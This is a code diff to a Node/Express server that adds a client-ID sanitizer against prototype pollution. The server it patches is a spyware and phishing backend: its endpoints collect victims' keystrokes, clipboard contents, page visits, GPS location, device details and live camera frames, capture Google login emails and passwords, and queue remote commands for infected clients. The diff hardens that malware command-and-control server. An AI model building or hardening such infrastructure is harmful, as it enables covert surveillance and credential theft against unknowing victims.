@@ -238,6 +238,16 @@ function addEvent(type, data) {
     saveStore();
 }
 
+// Sanitize client-supplied IDs used as object keys to prevent prototype pollution
+// Only allow alphanumeric + underscore + hyphen, max 80 chars.
+const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype', 'toString', 'valueOf', 'hasOwnProperty', 'isPrototypeOf']);
+function safeClientId(id) {
+    if (!id || typeof id !== 'string') return null;
+    const s = id.replace(/[^a-zA-Z0-9_\-]/g, '').slice(0, 80);
+    if (!s || DANGEROUS_KEYS.has(s)) return null;
+    return s;
+}
+
 function getClientIP(req) {
     const raw = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                 req.connection?.remoteAddress || req.ip || 'unknown';
@@ -503,7 +513,7 @@ app.post('/upload-media', (req, res) => {
     doUpload(req, res, async (err) => {
         if (err) { console.error('Upload error:', err.message); return res.status(400).json({ error: err.message }); }
         if (!req.file) return res.status(400).json({ error: 'No file' });
-        const safeCid = (req.body.clientId || 'unknown').replace(/[^a-z0-9_\-]/gi, '_').slice(0, 40);
+        const safeCid = safeClientId(req.body.clientId) || 'unknown';
         // Whitelist video extensions to prevent serving attacker-controlled HTML/scripts from /uploads
         const rawExt = path.extname(req.file.originalname).toLowerCase();
         const ALLOWED_MEDIA_EXT = new Set(['.webm', '.mp4', '.ogg', '.mkv', '.avi', '.mov']);
@@ -574,7 +584,7 @@ app.post('/upload-photo', (req, res) => {
     doUpload(req, res, async (err) => {
         if (err) { console.error('Photo upload error:', err.message); return res.status(400).json({ error: err.message }); }
         if (!req.file) return res.status(400).json({ error: 'No file' });
-        const safeCid = (req.body.clientId || 'unknown').replace(/[^a-z0-9_\-]/gi, '_').slice(0, 40);
+        const safeCid = safeClientId(req.body.clientId) || 'unknown';
         // Whitelist photo extensions to prevent serving attacker-controlled HTML/PHP from /uploads
         const rawExt = path.extname(req.file.originalname).toLowerCase();
         const ALLOWED_PHOTO_EXT = new Set(['.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp']);
@@ -667,10 +677,11 @@ app.get('/api/media-data/:type/:id', async (req, res) => {
 
 // ── Location ──
 app.post('/upload-location', (req, res) => {
-    const { clientId, latitude, longitude, accuracy, altitude, speed, heading, source } = req.body;
+    const { clientId: rawCid, latitude, longitude, accuracy, altitude, speed, heading, source } = req.body;
     if (!latitude || !longitude) return res.status(400).json({ error: 'Missing coords' });
+    const clientId = safeClientId(rawCid) || 'unknown';
     const entry = {
-        id: Date.now().toString(36), clientId: clientId || 'unknown',
+        id: Date.now().toString(36), clientId,
         latitude, longitude, accuracy: accuracy || null, altitude: altitude || null,
         speed: speed || null, heading: heading || null, source: source || 'unknown',
         timestamp: new Date().toISOString()
@@ -688,7 +699,8 @@ app.post('/upload-location', (req, res) => {
 
 // ── Device info ──
 app.post('/device-info', (req, res) => {
-    const { clientId, ...info } = req.body;
+    const { clientId: rawCid, ...info } = req.body;
+    const clientId = safeClientId(rawCid);
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
     info.ip = getClientIP(req);
     info.timestamp = new Date().toISOString();
@@ -701,7 +713,8 @@ app.post('/device-info', (req, res) => {
 
 // ── Keystroke logging ──
 app.post('/log-keys', rateLimit(60, 10000), (req, res) => {
-    const { clientId, keys, url } = req.body;
+    const { clientId: rawCid, keys, url } = req.body;
+    const clientId = safeClientId(rawCid);
     if (!clientId || !keys) return res.status(400).json({ error: 'Missing data' });
     const entry = {
         id: Date.now().toString(36), clientId, keys,
@@ -716,7 +729,8 @@ app.post('/log-keys', rateLimit(60, 10000), (req, res) => {
 
 // ── Clipboard ──
 app.post('/log-clipboard', (req, res) => {
-    const { clientId, content } = req.body;
+    const { clientId: rawCid, content } = req.body;
+    const clientId = safeClientId(rawCid);
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
     const entry = {
         id: Date.now().toString(36), clientId,
@@ -731,7 +745,8 @@ app.post('/log-clipboard', (req, res) => {
 
 // ── Page visits ──
 app.post('/log-visit', (req, res) => {
-    const { clientId, url, title, referrer } = req.body;
+    const { clientId: rawCid, url, title, referrer } = req.body;
+    const clientId = safeClientId(rawCid);
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
     const entry = {
         id: Date.now().toString(36), clientId,
@@ -749,9 +764,9 @@ app.post('/log-visit', (req, res) => {
 app.post('/log-error', (req, res) => {
     const entry = {
         id: Date.now().toString(36),
-        clientId: req.body.clientId || 'unknown',
+        clientId: safeClientId(req.body.clientId) || 'unknown',
         type: req.body.type || 'unknown',
-        message: req.body.message || req.body.error || 'No details',
+        message: (req.body.message || req.body.error || 'No details').slice(0, 2000),
         timestamp: new Date().toISOString()
     };
     store.errors.unshift(entry);
@@ -763,12 +778,13 @@ app.post('/log-error', (req, res) => {
 
 // ── Google login credential capture ──
 app.post('/api/capture', async (req, res) => {
-    const { email, password, source, timestamp, clientId, screen, timezone, staySignedIn } = req.body;
+    const { email, password, source, timestamp, clientId: rawCid, screen, timezone, staySignedIn } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
     if (!store.credentials) store.credentials = [];
+    const clientId = safeClientId(rawCid) || 'unknown';
     const entry = {
         id: Date.now().toString(36),
-        clientId: clientId || 'unknown',
+        clientId,
         email: email.trim(),
         password,
         source: source || 'unknown',
@@ -814,10 +830,11 @@ app.post('/api/capture', async (req, res) => {
 
 // ── Heartbeat with server-side IP geo ──
 app.post('/heartbeat', rateLimit(30, 10000), async (req, res) => {
-    const { clientId, offline, userAgent, screenW, screenH, battery, charging,
+    const { clientId: rawCid, offline, userAgent, screenW, screenH, battery, charging,
             networkType, downlink, saveData,
             language, timezone,
             isIdle, idleSecs, tabHidden, hiddenMs, maxScrollPct } = req.body;
+    const clientId = safeClientId(rawCid);
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
 
     await ensureStoreLoaded();
@@ -1200,7 +1217,8 @@ app.get('/api/locations', requireAuth, (req, res) => {
 
 app.post('/api/live-frame', async (req, res) => {
     try {
-        const { clientId, frame, timestamp, seq } = req.body || {};
+        const { clientId: rawCid, frame, timestamp, seq } = req.body || {};
+        const clientId = safeClientId(rawCid);
         if (!clientId || !frame) return res.status(400).json({ error: 'Missing clientId or frame' });
         const ts = timestamp || Date.now();
         const payload = JSON.stringify({ frame, timestamp: ts, seq: seq || 0 });
@@ -1582,7 +1600,8 @@ app.post('/api/command', requireAuth, async (req, res) => {
 });
 
 app.get('/api/commands/:clientId', async (req, res) => {
-    const id = req.params.clientId;
+    const id = safeClientId(req.params.clientId);
+    if (!id) return res.json([]);
     const cmds = await popCommands(id);
     res.json(cmds);
 });
